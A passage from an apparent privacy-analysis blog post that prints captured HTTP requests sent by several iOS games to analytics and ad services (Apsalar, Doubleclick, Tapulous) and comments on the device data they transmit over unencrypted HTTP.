class="crayon-v">oauth_signature_method</span><span class="crayon-o">=</span><span class="crayon-i">HMAC</span><span class="crayon-o">-</span><span class="crayon-i">SHA1</span><span class="crayon-o">&amp;</span><span class="crayon-v">oauth_timestamp</span><span class="crayon-o">=</span><span class="crayon-cn">1342817690</span><span class="crayon-o">&amp;</span><span class="crayon-v">oauth_nonce</span><span class="crayon-o">=</span><span class="crayon-i">AAB3E5CB</span><span class="crayon-o">-</span><span class="crayon-i">ED31</span><span class="crayon-o">-</span><span class="crayon-cn">4E6D</span><span class="crayon-o">-</span><span class="crayon-cn">9630</span><span class="crayon-o">-</span><span class="crayon-cn">8B77904B017B</span><span class="crayon-o">&amp;</span><span class="crayon-v">oauth_version</span><span class="crayon-o">=</span><span class="crayon-cn">1.0</span><span class="crayon-o">&amp;</span><span class="crayon-v">oauth_signature</span><span class="crayon-o">=</span><span class="crayon-cn">7Go5eBWufm6gST2w5h9yeDybnfc</span><span class="crayon-o">%</span><span class="crayon-cn">3D</span><span class="crayon-h"> </span><span class="crayon-i">HTTP</span><span class="crayon-o">/</span><span class="crayon-cn">1.1</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9aa0500821574-2"><span class="crayon-i">Host</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">api</span><span class="crayon-sy">.</span><span class="crayon-v">openfeint</span><span class="crayon-sy">.</span><span class="crayon-e">com</span></div><div class="crayon-line" id="crayon-53c98e7aa9aa0500821574-3"><span class="crayon-i">User</span><span class="crayon-o">-</span><span class="crayon-i">Agent</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">battlebearsroyal</span><span class="crayon-o">/</span><span class="crayon-cn">2012.06.19</span><span class="crayon-h"> </span><span class="crayon-i">CFNetwork</span><span class="crayon-o">/</span><span class="crayon-cn">548.1.4</span><span class="crayon-h"> </span><span class="crayon-i">Darwin</span><span class="crayon-o">/</span><span class="crayon-cn">11.0.0</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9aa0500821574-4"><span class="crayon-i">Accept</span><span class="crayon-o">-</span><span class="crayon-i">Language</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">en</span><span class="crayon-o">-</span><span class="crayon-e">us</span></div><div class="crayon-line" id="crayon-53c98e7aa9aa0500821574-5"><span class="crayon-i">Accept</span><span class="crayon-o">-</span><span class="crayon-i">Encoding</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">gzip</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-e">deflate</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9aa0500821574-6"><span class="crayon-i">Connection</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">keep</span><span class="crayon-o">-</span><span class="crayon-e">alive</span></div><div class="crayon-line" id="crayon-53c98e7aa9aa0500821574-7"><span class="crayon-i">Proxy</span><span class="crayon-o">-</span><span class="crayon-i">Connection</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">keep</span><span class="crayon-o">-</span><span class="crayon-i">alive</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0071 seconds] -->
<p></p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c98e7aa9aa9672206709" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
GET /api/v1/start?a=pikpok&amp;av=1.9.1&amp;c=wifi&amp;i=com.sidheinteractive.sif.FKS&amp;lag=0.00&amp;n=Flick%20Kick%20Football&amp;p=iOS&amp;rt=plist&amp;s=96BEDF5F-8FF5-45A4-A0C2-7F68ADFBC425&amp;sdk=Apsalar%2F4.0.1U&amp;u=de5381e09b10d93043b50f43153f3aeeb4dcc589&amp;v=5.1.1&amp;k=UDID&amp;dk=%5B%5D&amp;cr=1&amp;h=d0df679d2bd892fb83972827ce578ed517e186d0 HTTP/1.1
Host: e.apsalar.com
User-Agent: Flick%20Kick%20Football/1.9.1 CFNetwork/548.1.4 Darwin/11.0.0
Accept-Language: en-us
Accept-Encoding: gzip, deflate
Pragma: no-cache
Connection: keep-alive
Proxy-Connection: keep-alive</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98e7aa9aa9672206709-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9aa9672206709-2">2</div><div class="crayon-num" data-line="crayon-53c98e7aa9aa9672206709-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9aa9672206709-4">4</div><div class="crayon-num" data-line="crayon-53c98e7aa9aa9672206709-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9aa9672206709-6">6</div><div class="crayon-num" data-line="crayon-53c98e7aa9aa9672206709-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9aa9672206709-8">8</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98e7aa9aa9672206709-1"><span class="crayon-i">GET</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">api</span><span class="crayon-o">/</span><span class="crayon-i">v1</span><span class="crayon-o">/</span><span class="crayon-i">start</span><span class="crayon-sy">?</span><span class="crayon-v">a</span><span class="crayon-o">=</span><span class="crayon-i">pikpok</span><span class="crayon-o">&amp;</span><span class="crayon-v">av</span><span class="crayon-o">=</span><span class="crayon-cn">1.9.1</span><span class="crayon-o">&amp;</span><span class="crayon-v">c</span><span class="crayon-o">=</span><span class="crayon-i">wifi</span><span class="crayon-o">&amp;</span><span class="crayon-v">i</span><span class="crayon-o">=</span><span class="crayon-v">com</span><span class="crayon-sy">.</span><span class="crayon-v">sidheinteractive</span><span class="crayon-sy">.</span><span class="crayon-v">sif</span><span class="crayon-sy">.</span><span class="crayon-i">FKS</span><span class="crayon-o">&amp;</span><span class="crayon-v">lag</span><span class="crayon-o">=</span><span class="crayon-cn">0.00</span><span class="crayon-o">&amp;</span><span class="crayon-v">n</span><span class="crayon-o">=</span><span class="crayon-i">Flick</span><span class="crayon-o">%</span><span class="crayon-cn">20Kick</span><span class="crayon-o">%</span><span class="crayon-cn">20Football</span><span class="crayon-o">&amp;</span><span class="crayon-v">p</span><span class="crayon-o">=</span><span class="crayon-i">iOS</span><span class="crayon-o">&amp;</span><span class="crayon-v">rt</span><span class="crayon-o">=</span><span class="crayon-i">plist</span><span class="crayon-o">&amp;</span><span class="crayon-v">s</span><span class="crayon-o">=</span><span class="crayon-cn">96BEDF5F</span><span class="crayon-o">-</span><span class="crayon-cn">8FF5</span><span class="crayon-o">-</span><span class="crayon-cn">45A4</span><span class="crayon-o">-</span><span class="crayon-i">A0C2</span><span class="crayon-o">-</span><span class="crayon-cn">7F68ADFBC425</span><span class="crayon-o">&amp;</span><span class="crayon-v">sdk</span><span class="crayon-o">=</span><span class="crayon-i">Apsalar</span><span class="crayon-o">%</span><span class="crayon-cn">2F4.0.1U</span><span class="crayon-o">&amp;</span><span class="crayon-v">u</span><span class="crayon-o">=</span><span class="crayon-i">de5381e09b10d93043b50f43153f3aeeb4dcc589</span><span class="crayon-o">&amp;</span><span class="crayon-v">v</span><span class="crayon-o">=</span><span class="crayon-cn">5.1.1</span><span class="crayon-o">&amp;</span><span class="crayon-v">k</span><span class="crayon-o">=</span><span class="crayon-i">UDID</span><span class="crayon-o">&amp;</span><span class="crayon-v">dk</span><span class="crayon-o">=</span><span class="crayon-o">%</span><span class="crayon-cn">5B</span><span class="crayon-o">%</span><span class="crayon-cn">5D</span><span class="crayon-o">&amp;</span><span class="crayon-v">cr</span><span class="crayon-o">=</span><span class="crayon-cn">1</span><span class="crayon-o">&amp;</span><span class="crayon-v">h</span><span class="crayon-o">=</span><span class="crayon-e">d0df679d2bd892fb83972827ce578ed517e186d0 </span><span class="crayon-i">HTTP</span><span class="crayon-o">/</span><span class="crayon-cn">1.1</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9aa9672206709-2"><span class="crayon-i">Host</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">e</span><span class="crayon-sy">.</span><span class="crayon-v">apsalar</span><span class="crayon-sy">.</span><span class="crayon-e">com</span></div><div class="crayon-line" id="crayon-53c98e7aa9aa9672206709-3"><span class="crayon-i">User</span><span class="crayon-o">-</span><span class="crayon-i">Agent</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">Flick</span><span class="crayon-o">%</span><span class="crayon-cn">20Kick</span><span class="crayon-o">%</span><span class="crayon-cn">20Football</span><span class="crayon-o">/</span><span class="crayon-cn">1.9.1</span><span class="crayon-h"> </span><span class="crayon-i">CFNetwork</span><span class="crayon-o">/</span><span class="crayon-cn">548.1.4</span><span class="crayon-h"> </span><span class="crayon-i">Darwin</span><span class="crayon-o">/</span><span class="crayon-cn">11.0.0</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9aa9672206709-4"><span class="crayon-i">Accept</span><span class="crayon-o">-</span><span class="crayon-i">Language</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">en</span><span class="crayon-o">-</span><span class="crayon-e">us</span></div><div class="crayon-line" id="crayon-53c98e7aa9aa9672206709-5"><span class="crayon-i">Accept</span><span class="crayon-o">-</span><span class="crayon-i">Encoding</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">gzip</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-e">deflate</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9aa9672206709-6"><span class="crayon-i">Pragma</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">no</span><span class="crayon-o">-</span><span class="crayon-e">cache</span></div><div class="crayon-line" id="crayon-53c98e7aa9aa9672206709-7"><span class="crayon-i">Connection</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">keep</span><span class="crayon-o">-</span><span class="crayon-e">alive</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9aa9672206709-8"><span class="crayon-i">Proxy</span><span class="crayon-o">-</span><span class="crayon-i">Connection</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">keep</span><span class="crayon-o">-</span><span class="crayon-i">alive</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0066 seconds] -->
<p>## googleads.g.doubleclick.net ##<br />
Doubleclick is your standard Google advertising platform. No sort of magic here. But for whatever reason, Google has opted to use HTTP here over HTTPS, which is very interesting.</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c98e7aa9ab2508800280" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
GET /mads/gma?hl=en&amp;u_h=768&amp;submodel=iPad1%2C1&amp;js=afma-sdk-i-v5.0.8&amp;u_sd=1&amp;preqs=1&amp;u_so=l&amp;platform=iPad&amp;format=interstitial_mb&amp;app_name=1.2.2.iphone.com.rovio.com.rovio.AngryBirdsSpaceFreeHD&amp;ptime=427&amp;slotname=a14f5909c623a5e&amp;u_audio=1&amp;session_id=4564260827863653894&amp;u_w=1024&amp;cap_bs=2&amp;msid=526337775&amp;output=html&amp;region=mobile_app&amp;u_tz=420&amp;ex=1&amp;client_sdk=1&amp;askip=1&amp;caps=interactiveVideo_inlineVideo_clickTracking_sdkAdmobApiForAds&amp;jsv=27&amp;ms=z-LWReOp7D7WD_1UvoVx3_gpXfNE_ythiaqxdA0HRQe2SwhHy89IPndVMK_CAGIoMh7Trtyn_5KhXCZ53TjNjWHFhpkEaxiJGZ5m-3yokYnLL8LmC1A1lwkyjcNbXTKfeSAmYquteLFeCDN60VoZyBrYNAHlEmyuakhJncE7mwM8u72hMV04OlbCQ1g_2uN80jjuyfI1vM0YJlJ4qKtMXSfiB3cQW-KG0XOwQPoGtjs9kgB--JcyQpzLftNDJb_ScSERgQaHZ7982vCA0z4OB8hWseZlfqioY9EYshs5oVEq-fNiZd8xX-jAFkXVWldFo4089USHnsLSGKaDk4eKXA HTTP/1.1
Host: googleads.g.doubleclick.net:80
User-Agent: Mozilla/5.0 (iPad; CPU OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Mobile/9B206
Accept-Language: en-us
Accept-Encoding: gzip, deflate
Connection: keep-alive
Proxy-Connection: keep-alive</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98e7aa9ab2508800280-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9ab2508800280-2">2</div><div class="crayon-num" data-line="crayon-53c98e7aa9ab2508800280-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9ab2508800280-4">4</div><div class="crayon-num" data-line="crayon-53c98e7aa9ab2508800280-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9ab2508800280-6">6</div><div class="crayon-num" data-line="crayon-53c98e7aa9ab2508800280-7">7</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98e7aa9ab2508800280-1"><span class="crayon-i">GET</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">mads</span><span class="crayon-o">/</span><span class="crayon-i">gma</span><span class="crayon-sy">?</span><span class="crayon-v">hl</span><span class="crayon-o">=</span><span class="crayon-i">en</span><span class="crayon-o">&amp;</span><span class="crayon-v">u_h</span><span class="crayon-o">=</span><span class="crayon-cn">768</span><span class="crayon-o">&amp;</span><span class="crayon-v">submodel</span><span class="crayon-o">=</span><span class="crayon-i">iPad1</span><span class="crayon-o">%</span><span class="crayon-cn">2C1</span><span class="crayon-o">&amp;</span><span class="crayon-v">js</span><span class="crayon-o">=</span><span class="crayon-i">afma</span><span class="crayon-o">-</span><span class="crayon-i">sdk</span><span class="crayon-o">-</span><span class="crayon-i">i</span><span class="crayon-o">-</span><span class="crayon-v">v5</span><span class="crayon-sy">.</span><span class="crayon-cn">0.8</span><span class="crayon-o">&amp;</span><span class="crayon-v">u_sd</span><span class="crayon-o">=</span><span class="crayon-cn">1</span><span class="crayon-o">&amp;</span><span class="crayon-v">preqs</span><span class="crayon-o">=</span><span class="crayon-cn">1</span><span class="crayon-o">&amp;</span><span class="crayon-v">u_so</span><span class="crayon-o">=</span><span class="crayon-i">l</span><span class="crayon-o">&amp;</span><span class="crayon-v">platform</span><span class="crayon-o">=</span><span class="crayon-i">iPad</span><span class="crayon-o">&amp;</span><span class="crayon-v">format</span><span class="crayon-o">=</span><span class="crayon-i">interstitial_mb</span><span class="crayon-o">&amp;</span><span class="crayon-v">app_name</span><span class="crayon-o">=</span><span class="crayon-cn">1.2.2.iphone.com.rovio.com.rovio.AngryBirdsSpaceFreeHD</span><span class="crayon-o">&amp;</span><span class="crayon-v">ptime</span><span class="crayon-o">=</span><span class="crayon-cn">427</span><span class="crayon-o">&amp;</span><span class="crayon-v">slotname</span><span class="crayon-o">=</span><span class="crayon-i">a14f5909c623a5e</span><span class="crayon-o">&amp;</span><span class="crayon-v">u_audio</span><span class="crayon-o">=</span><span class="crayon-cn">1</span><span class="crayon-o">&amp;</span><span class="crayon-v">session_id</span><span class="crayon-o">=</span><span class="crayon-cn">4564260827863653894</span><span class="crayon-o">&amp;</span><span class="crayon-v">u_w</span><span class="crayon-o">=</span><span class="crayon-cn">1024</span><span class="crayon-o">&amp;</span><span class="crayon-v">cap_bs</span><span class="crayon-o">=</span><span class="crayon-cn">2</span><span class="crayon-o">&amp;</span><span class="crayon-v">msid</span><span class="crayon-o">=</span><span class="crayon-cn">526337775</span><span class="crayon-o">&amp;</span><span class="crayon-v">output</span><span class="crayon-o">=</span><span class="crayon-i">html</span><span class="crayon-o">&amp;</span><span class="crayon-v">region</span><span class="crayon-o">=</span><span class="crayon-i">mobile_app</span><span class="crayon-o">&amp;</span><span class="crayon-v">u_tz</span><span class="crayon-o">=</span><span class="crayon-cn">420</span><span class="crayon-o">&amp;</span><span class="crayon-v">ex</span><span class="crayon-o">=</span><span class="crayon-cn">1</span><span class="crayon-o">&amp;</span><span class="crayon-v">client_sdk</span><span class="crayon-o">=</span><span class="crayon-cn">1</span><span class="crayon-o">&amp;</span><span class="crayon-v">askip</span><span class="crayon-o">=</span><span class="crayon-cn">1</span><span class="crayon-o">&amp;</span><span class="crayon-v">caps</span><span class="crayon-o">=</span><span class="crayon-i">interactiveVideo_inlineVideo_clickTracking_sdkAdmobApiForAds</span><span class="crayon-o">&amp;</span><span class="crayon-v">jsv</span><span class="crayon-o">=</span><span class="crayon-cn">27</span><span class="crayon-o">&amp;</span><span class="crayon-v">ms</span><span class="crayon-o">=</span><span class="crayon-i">z</span><span class="crayon-o">-</span><span class="crayon-i">LWReOp7D7WD_1UvoVx3_gpXfNE_ythiaqxdA0HRQe2SwhHy89IPndVMK_CAGIoMh7Trtyn_5KhXCZ53TjNjWHFhpkEaxiJGZ5m</span><span class="crayon-o">-</span><span class="crayon-cn">3yokYnLL8LmC1A1lwkyjcNbXTKfeSAmYquteLFeCDN60VoZyBrYNAHlEmyuakhJncE7mwM8u72hMV04OlbCQ1g_2uN80jjuyfI1vM0YJlJ4qKtMXSfiB3cQW</span><span class="crayon-o">-</span><span class="crayon-i">KG0XOwQPoGtjs9kgB</span><span class="crayon-o">--</span><span class="crayon-i">JcyQpzLftNDJb_ScSERgQaHZ7982vCA0z4OB8hWseZlfqioY9EYshs5oVEq</span><span class="crayon-o">-</span><span class="crayon-i">fNiZd8xX</span><span class="crayon-o">-</span><span class="crayon-e">jAFkXVWldFo4089USHnsLSGKaDk4eKXA </span><span class="crayon-i">HTTP</span><span class="crayon-o">/</span><span class="crayon-cn">1.1</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9ab2508800280-2"><span class="crayon-i">Host</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">googleads</span><span class="crayon-sy">.</span><span class="crayon-v">g</span><span class="crayon-sy">.</span><span class="crayon-v">doubleclick</span><span class="crayon-sy">.</span><span class="crayon-i">net</span><span class="crayon-o">:</span><span class="crayon-cn">80</span></div><div class="crayon-line" id="crayon-53c98e7aa9ab2508800280-3"><span class="crayon-i">User</span><span class="crayon-o">-</span><span class="crayon-i">Agent</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">Mozilla</span><span class="crayon-o">/</span><span class="crayon-cn">5.0</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-i">iPad</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-e">CPU </span><span class="crayon-i">OS</span><span class="crayon-h"> </span><span class="crayon-cn">5_1_1</span><span class="crayon-h"> </span><span class="crayon-e">like </span><span class="crayon-e">Mac </span><span class="crayon-i">OS</span><span class="crayon-h"> </span><span class="crayon-i">X</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-i">AppleWebKit</span><span class="crayon-o">/</span><span class="crayon-cn">534.46</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-i">KHTML</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-e">like </span><span class="crayon-i">Gecko</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-i">Mobile</span><span class="crayon-o">/</span><span class="crayon-cn">9B206</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9ab2508800280-4"><span class="crayon-i">Accept</span><span class="crayon-o">-</span><span class="crayon-i">Language</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">en</span><span class="crayon-o">-</span><span class="crayon-e">us</span></div><div class="crayon-line" id="crayon-53c98e7aa9ab2508800280-5"><span class="crayon-i">Accept</span><span class="crayon-o">-</span><span class="crayon-i">Encoding</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">gzip</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-e">deflate</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9ab2508800280-6"><span class="crayon-i">Connection</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">keep</span><span class="crayon-o">-</span><span class="crayon-e">alive</span></div><div class="crayon-line" id="crayon-53c98e7aa9ab2508800280-7"><span class="crayon-i">Proxy</span><span class="crayon-o">-</span><span class="crayon-i">Connection</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">keep</span><span class="crayon-o">-</span><span class="crayon-i">alive</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0090 seconds] -->
<p>It has a bit of seemingly hashed/encrypted content. And then a bunch of the normal content:</p>
<ul>
<li>Language</li>
<li>Screen resolution</li>
<li>Device model</li>
<li>Application identifier</li>
</ul>
<p><strong>blog.analytics.tapulous.com</strong><br />
This one is a bit tricky. I was unable to easily locate a privacy policy for this service specifically. The domain it uses redirects directly to the Tap Tap Revenge Facebook page, which was the first game made by Tapulous. The company was acquired by Disney Interactive Studios in 2010, which explains why it is being used by a Disney application. But it communicates over HTTP, and is extremely verbose due to the use of POST forms rather than query-string parameters.</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c98e7aa9abd919423952" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
POST / HTTP/1.1
Host: blog.analytics.tapulous.com
User-Agent: FixitFelix_Disney/1.0 CFNetwork/548.1.4 Darwin/11.0.0
Content-Length: 1666
Content-Type: multipart/form-data; boundary=GOGO-87dae883c6039b244c0d341f45f8-SEP
Accept-Language: en-us
Accept-Encoding: gzip, deflate
Pragma: no-cache
Connection: keep-alive
Proxy-Connection: keep-alive

--GOGO-87dae883c6039b244c0d341f45f8-SEP
Content-Disposition: form-data; name="method"

app_start
--GOGO-87dae883c6039b244c0d341f45f8-SEP
Content-Disposition: form-data; name="api_sig"

P66Of4Tr9pMZShBRQcx4TyOMy8M%3D
--GOGO-87dae883c6039b244c0d341f45f8-SEP
Content-Disposition: form-data; name="os_version"

5.1.1
--GOGO-87dae883c6039b244c0d341f45f8-SEP
Content-Disposition: form-data; name="timestamp"

1342827611
--GOGO-87dae883c6039b244c0d341f45f8-SEP
Content-Disposition: form-data; name="token_info"

50b38ddd5dff76c9c43c1f896430c4a9b907c4e445be2c9161e727f01ff836b8c53bbd53511704b35f3ac9449efb5aa6
--GOGO-87dae883c6039b244c0d341f45f8-SEP
Content-Disposition: form-data; name="onlineflag"

2
--GOGO-87dae883c6039b244c0d341f45f8-SEP
Content-Disposition: form-data; name="api_key"

E217E5E8-59FC-4EF3-8165-DDC6F86B2D55
--GOGO-87dae883c6039b244c0d341f45f8-SEP
Content-Disposition: form-data; name="machine"

iPad1,1
--GOGO-87dae883c6039b244c0d341f45f8-SEP
Content-Disposition: form-data; name="model"

iPad
--GOGO-87dae883c6039b244c0d341f45f8-SEP
Content-Disposition: form-data; name="bundle_id"

com.disney.FixItFelixJr
--GOGO-87dae883c6039b244c0d341f45f8-SEP
Content-Disposition: form-data; name="session_hash"

04F24E10-FF3D-4675-BEE2-D230D1FF0AB4
--GOGO-87dae883c6039b244c0d341f45f8-SEP
Content-Disposition: form-data; name="app_version"

1.0
--GOGO-87dae883c6039b244c0d341f45f8-SEP
Content-Disposition: form-data; name="DMOLibVersion"

2.50
--GOGO-87dae883c6039b244c0d341f45f8-SEP
Content-Disposition: form-data; name="UTCTime"

2012-07-20 16:40:10 -25200 (PDT)
--GOGO-87dae883c6039b244c0d341f45f8-SEP--</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98e7aa9abd919423952-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9abd919423952-2">2</div><div class="crayon-num" data-line="crayon-53c98e7aa9abd919423952-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9abd919423952-4">4</div><div class="crayon-num" data-line="crayon-53c98e7aa9abd919423952-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9abd919423952-6">6</div><div class="crayon-num" data-line="crayon-53c98e7aa9abd919423952-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9abd919423952-8">8</div><div class="crayon-num" data-line="crayon-53c98e7aa9abd919423952-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9abd919423952-10">10</div><div class="crayon-num" data-line="crayon-53c98e7aa9abd919423952-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9abd919423952-12">12</div><div class="crayon-num" data-line="crayon-53c98e7aa9abd919423952-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9abd919423952-14">14</div><div class="crayon-num" data-line="crayon-53c98e7aa9abd919423952-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9abd919423952-16">16</div><div class="crayon-num" data-line="crayon-53c98e7aa9abd919423952-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9abd919423952-18">18</div><div class="crayon-num" data-line="crayon-53c98e7aa9abd919423952-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9abd919423952-20">20</div><div class="crayon-num" data-line="crayon-53c98e7aa9abd919423952-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9abd919423952-22">22</div><div 